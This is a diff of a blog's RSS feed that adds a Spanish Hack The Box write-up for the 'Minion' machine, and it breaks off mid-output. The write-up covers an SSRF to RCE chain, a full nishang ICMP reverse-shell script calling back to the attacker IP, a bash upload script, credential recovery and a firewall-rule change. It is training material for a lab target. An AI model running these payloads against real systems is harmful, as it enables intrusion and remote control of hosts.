@@ -5,9 +5,528 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 13 Oct 2023 18:44:31 -0500</pubDate>
-    <lastBuildDate>Fri, 13 Oct 2023 18:44:31 -0500</lastBuildDate>
+    <pubDate>Tue, 17 Oct 2023 00:28:45 -0500</pubDate>
+    <lastBuildDate>Tue, 17 Oct 2023 00:28:45 -0500</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>Maquina Minion - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Minion&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad insane, esta vez vamos contra una maquina potente donde a traves de un servicio &lt;code&gt;http&lt;/code&gt; vamos a aprovecharnos de un &lt;code&gt;SSRF&lt;/code&gt; para descubrir un puerto interno local que a traves de un parametro nos permitira realizar &lt;code&gt;RCE&lt;/code&gt;, pero al existir reglas de &lt;code&gt;firewall&lt;/code&gt; implementadas por &lt;code&gt;TCP&lt;/code&gt; y por &lt;code&gt;UDP&lt;/code&gt; ganaremos acceso por &lt;code&gt;ICMP&lt;/code&gt;, despues abusaremos de los permisos de un script en &lt;code&gt;powershell&lt;/code&gt; para mediante una tarea programada obtener unas contraseñas privilegiadas y finalmente manipularemos las reglas de &lt;code&gt;firewall&lt;/code&gt; para habilitarnos el acceso a los puertos internos de la maquina y poder ejecutar un &lt;code&gt;exe&lt;/code&gt; que nos permitira visualizar la root.txt como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maquina muy guapa asi que vamos a darle!.&lt;/p&gt;
+
+&lt;p&gt;Comenzamos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Minion
+❯ ls
+
+ Minion
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.57
+PING 10.10.10.57 (10.10.10.57) 56(84) bytes of data.
+64 bytes from 10.10.10.57: icmp_seq=1 ttl=127 time=194 ms
+
+--- 10.10.10.57 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 193.546/193.546/193.546/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.57 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 17:12 -05
+Initiating SYN Stealth Scan at 17:12
+Scanning 10.10.10.57 [65535 ports]
+Discovered open port 62696/tcp on 10.10.10.57
+Completed SYN Stealth Scan at 17:13, 26.44s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.57
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-10-15 17:12:41 -05 for 27s
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+62696/tcp open  unknown syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
+           Raw packets sent: 131083 (5.768MB) | Rcvd: 15 (660B)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p62696 10.10.10.57 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 17:14 -05
+Nmap scan report for 10.10.10.57
+Host is up (0.16s latency).
+
+PORT      STATE SERVICE VERSION
+62696/tcp open  http    Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 1 disallowed entry 
+|_/backend
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;62696&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Microsoft IIS httpd 8.5&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Como vemos que el puerto &lt;code&gt;62696&lt;/code&gt; corresponde a un servicio web con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de enumear las tecnolologias que utiliza y tal como nos muestra &lt;code&gt;nmap&lt;/code&gt; nos enfrentamosa un IIS.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.57:62696
+http://10.10.10.57:62696 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.10.57], Microsoft-IIS[8.5], X-Powered-By[ASP.NET]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procedemos a abrir el servicio en nuestro navegador y visualizamos una pagina referente a minions.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como nos enfrentamos a un &lt;code&gt;IIS&lt;/code&gt;, con &lt;code&gt;wfuzz&lt;/code&gt; podemos tratar de fuzzear archivos con extensiones &lt;code&gt;asp y aspx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,asp-aspx -u http://10.10.10.57:62696/FUZZ.FUZ2Z
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.57:62696/FUZZ.FUZ2Z
+Total requests: 441120
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000001221:   200        0 L      7 W        41 Ch       &quot;test - asp&quot;       
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;visualizamos la ruta &lt;code&gt;test.asp&lt;/code&gt; y observamos que nos solicita el parametro &lt;code&gt;u&lt;/code&gt; para realizar la solicitud.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Haciendo uso del parametro, podemos tratar de enviarnos una petición hacia nuestro equipo pero vemos falla.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Recordemos pero que tambien podemos realizar peticiones apuntando hacia la propia maquina y en efecto vemos contenido en el puerto &lt;code&gt;80&lt;/code&gt; en local.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre las opciones que tenemos podemos ver &lt;code&gt;system commands&lt;/code&gt; y si hacemos hovering nos muestra la ruta &lt;code&gt;cmd.aspx&lt;/code&gt;, asi que podemos tratar de llegar a esta con la petición interna.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si tratamos de ejecutar un comando nos muestra un error, pero si inspeccionamos el codigo fuente vemos que necesitamos incorporar el parametro &lt;code&gt;xcmd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos nuevamente a ejecutar un comando, esta vez mandando una traza a nuestra maquina host, obtenemos un &lt;code&gt;exit status = 0&lt;/code&gt; y recibimos la petición correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -v
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+17:40:07.142661 IP (tos 0x0, ttl 127, id 6473, offset 0, flags [none], proto ICMP (1), length 60)
+    10.10.10.57 &amp;gt; 10.10.16.10: ICMP echo request, id 1, seq 1, length 40
+17:40:07.142685 IP (tos 0x0, ttl 64, id 60344, offset 0, flags [none], proto ICMP (1), length 60)
+    10.10.16.10 &amp;gt; 10.10.10.57: ICMP echo reply, id 1, seq 1, length 40
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora que tenemos &lt;code&gt;RCE&lt;/code&gt; podemos tratar de enviarnos una &lt;code&gt;reverse shell&lt;/code&gt; a nuestra maquina, pero no va a ser posible puesto que por dentro existen reglas de firewall que evitan que ganemos acceso por &lt;code&gt;tcp&lt;/code&gt; y por &lt;code&gt;udp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Pero podriamos entablarnos una &lt;code&gt;reverse shell&lt;/code&gt; por &lt;code&gt;ICMP&lt;/code&gt; ya que tenemos traza con nuestra maquina, para ello vamos a usar el script &lt;code&gt;Invoke-PowerShellIcmp.ps1&lt;/code&gt; del repositorio de &lt;code&gt;nishang&lt;/code&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script &lt;code&gt;icmpsh_m.py&lt;/code&gt; que necesitamos descargar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos descargamos el archivo y ejecutamos los comandos.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py&quot;&gt;https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahora para evitar problemas en el script &lt;code&gt;Invoke-PowerShellIcmp.ps1&lt;/code&gt; vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final &lt;code&gt;Invoke-PowerShellIcmp -IPAddress 10.10.16.10&lt;/code&gt;, para que al interpretarse ejecute la instrucción.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d' &amp;gt; icmp.ps1
+❯ cat icmp.ps1
+function Invoke-PowerShellIcmp
+{ 
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String]
+        $IPAddress,
+        [Parameter(Position = 1, Mandatory = $false)]
+        [Int]
+        $Delay = 5,
+        [Parameter(Position = 2, Mandatory = $false)]
+        [Int]
+        $BufferSize = 128
+    )
+    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+    $PingOptions.DontFragment = $True
+    $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt; ')
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+    while ($true)
+    {
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
+        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
+        if ($reply.Buffer)
+        {
+            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
+            $result = (Invoke-Expression -Command $response 2&amp;gt;&amp;amp;1 | Out-String )
+            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
+            $index = [math]::floor($sendbytes.length/$BufferSize)
+            $i = 0
+            if ($sendbytes.length -gt $BufferSize)
+            {
+                while ($i -lt $index )
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                    $i +=1
+                }
+                $remainingindex = $sendbytes.Length % $BufferSize
+                if ($remainingindex -ne 0)
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                }
+            }
+            else
+            {
+                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
+            }
+            $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;`nPS &quot; + (Get-Location).Path + '&amp;gt; ')
+            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+        }
+        else
+        {
+            Start-Sleep -Seconds $Delay
+        }
+    }
+}
+Invoke-PowerShellIcmp -IPAddress 10.10.16.10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo que tenemos que hacer ahora es meter este script en la maquina victima, pero debemos hacerlo en un formato en la que &lt;code&gt;powershell&lt;/code&gt; lo entienda por ello usaremos &lt;code&gt;iconv&lt;/code&gt; para separ cada caracter y despues convertirlo en base64.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat icmp.ps1 | iconv -t utf-16le | base64 -w 0 &amp;gt; icmp.ps1.b64
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora vamos a crear un script en &lt;code&gt;bash&lt;/code&gt; que nos ayude a automatizar la inserción de nuestro script en la maquina victima, vamos a utilizar &lt;code&gt;curl&lt;/code&gt; pero como tiene un numero limite de caracteres por linea que podemos enviar, a nuestro script &lt;code&gt;icmp.ps1.b64&lt;/code&gt; vamos a aplicarle el comando &lt;code&gt;fold&lt;/code&gt; para que tenga un numero de caracteres igual por cada linea y asi evitar problemas.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat automatize.sh
+#!/bin/bash
+
+function ctrl_c(){
+    echo -e &quot;\[!] Saliendo...&quot;
+    tput cnorm; exit 1
+}
+
+#CTRL_C
+trap ctrl_c INT
+
+declare -r main_url=&quot;http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx&quot;
+
+counter=0
+
+echo; tput civis; for line in $(cat icmp.ps1.b64); do 
+    command=&quot;echo $line &amp;gt;&amp;gt; C:\Temp\script.ps1&quot;
+
+    echo -ne &quot;[+] Total de lineas enviadas [$counter/87]\r&quot;
+
+    curl -s -X GET -G $main_url --data-urlencode &quot;xcmd=$command&quot; &amp;amp;&amp;gt;/dev/null
+
+    let counter+=1
+
+done; tput cnorm
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al ejecutar el script lo que hara sera crear el archivo &lt;code&gt;script.ps1&lt;/code&gt; en la ruta &lt;code&gt;C:\Temp\&lt;/code&gt; con el contenido del &lt;code&gt;icmp.ps1.b64&lt;/code&gt;, esto podemos verificarlo si desde el navegador le hacemos un &lt;code&gt;type&lt;/code&gt; para leerlo y nos muestra con exist status 0.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para poder ejcutarlo primero debemos transformar la data a un codigo legible por &lt;code&gt;powershell&lt;/code&gt; ya que esta se encuentra en base64, para ello usaremos los siguientes comandos ejecutados desde una powershell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;❯ pwsh
+PowerShell 7.2.1
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+Welcome to Parrot OS 
+
+┌[parrot@root]-[10:48-16/10]-[/home/fmiracle/machines/Minion/content]
+└╼$ $fileContent = Get-Content ./icmp.ps1.b64
+┌[parrot@root]-[10:51-16/10]-[/home/fmiracle/machines/Minion/content]
+└╼$ $fileDecode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($fileContent))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;De esta manera similar tendriamos que introducirlo en la maquina, pero aputando al archivo &lt;code&gt;script.ps1&lt;/code&gt; en la maquina victima.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si leemos el nuevo archivo, vemos que lo creamos de manera existosa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora no olvidemos ejcutar los comandos que requeria el script, usare &lt;code&gt;rlwrap&lt;/code&gt; para tener un mejor manejo de la consola.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ sysctl -w net.ipv4.icmp_echo_ignore_all=1
+❯ rlwrap python icmpsh_m.py 10.10.16.10 10.10.10.57
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora que estamos en escucha solo debemos ejecutar el script y recibimos la conexión.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ rlwrap python icmpsh_m.py 10.10.16.10 10.10.10.57
+Windows PowerShell running as user MINION$ on MINION
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+iis apppool\defaultapppool
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora al tratar de listar el directorio personal del usuario decoder.MINION, no tenemos acceso:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero si listamos la raiz, vemos un directorio &lt;code&gt;sysadmscripts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro vemos dos archivos uno &lt;code&gt;.bat&lt;/code&gt; y un script en powershell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el &lt;code&gt;del_logs.bat&lt;/code&gt; ejecuta el &lt;code&gt;c.ps1&lt;/code&gt; y como es de borrado de logs, quiero pensar que hay una tarea programada que lo ejecuta a intervalos regulares de tiempo.&lt;/p&gt;
+
+&lt;p&gt;Si vemos los permisos del script &lt;code&gt;c.ps1&lt;/code&gt; todos tienen privilegios full sobre este, entonces podemos tratar de manipularlo y traernos los archivos del directorio del usuario &lt;code&gt;decoder.MINION&lt;/code&gt; asumiendo que este usuario es el que realiza la ejecución de la tarea o otro con mas privilegios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listamos el directorio despues de unos minutos y vemos un backup.zip y la flag &lt;code&gt;user.txt&lt;/code&gt; que procederemos a leer.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Vemos que ademas de la flag, obtuvimos un archivo comprimido &lt;code&gt;backup.zip&lt;/code&gt;, que si bien podemos descomprimirlo no vamos a encontrar información relevante, por ello debemos pensar fuera de la caja y preguntarnos que formas existen en windows para ocultar información o metadatos.&lt;/p&gt;
+
+&lt;p&gt;Por ello debemos tener en cuenta el concepto de los &lt;code&gt;Alternative Data Streams - ADS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ADS: Los Flujos Alternativos de Datos, Alternate Data Streams o ADS son una característica del sistema de archivos NTFS que permite almacenar metainformación con un fichero, sin necesidad de usar un fichero separado para almacenarla.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Para poder ver si hay configurados &lt;code&gt;ADS&lt;/code&gt; en una ruta, debemos ejecutar el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mi7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el archivo &lt;code&gt;backup.zip&lt;/code&gt; tiene una &lt;code&gt;ADS&lt;/code&gt; pass, asi que leemos el contenido y encontramos un hash en &lt;code&gt;md5&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;type C:\Temp\backup.zip:pass
+28a5d1e0c15af9f8fce7db65d75bbf17
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo crackeamos usando nuestra pagina de confianza y obtenemos una contraseña.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si bien contamos con credenciales, no podemos conectarnos con &lt;code&gt;evil-winrm&lt;/code&gt; o con &lt;code&gt;psexec&lt;/code&gt; debido a que solo vemos abierto el puerto &lt;code&gt;62696&lt;/code&gt;, pero podemos hacer uso de &lt;code&gt;PSCredential&lt;/code&gt; y ejecutar un comando a traves de &lt;code&gt;ScriptBlock&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;hostname
+minion
+
+        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 
+minion\administrator
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora podriamos tratar de ejecutar leer la segunda flag, vemos que antes tenemos que ejecutar el &lt;code&gt;root.exe&lt;/code&gt;, pero curiosamente no podemos hacerlo desde aqui.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
+In order to get the flag you have to launch root.exe located in this folder!
+
+        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { C:\Users\Administrator\Desktop\root.exe }
+Are you trying to cheat me?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora recordemos que tenemos privilegios como administradores, asi que podemos tratar de modificar las reglas de &lt;code&gt;firewall&lt;/code&gt;, de modo que tengamos acceso a los puertos que estan abiertos internamente en la maquina.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { New-NetFirewallRule -DisplayName fmiracle -RemoteAddress 10.10.16.10 -Direction inbound -Action allow }
+
+Name                    : {fe96175f-38d1-451f-ad74-95e144f0d702}
+ID                      : {fe96175f-38d1-451f-ad74-95e144f0d702}
+Group                   : 
+Platform                : {}
+LSM                     : False
+Profile                 : Any
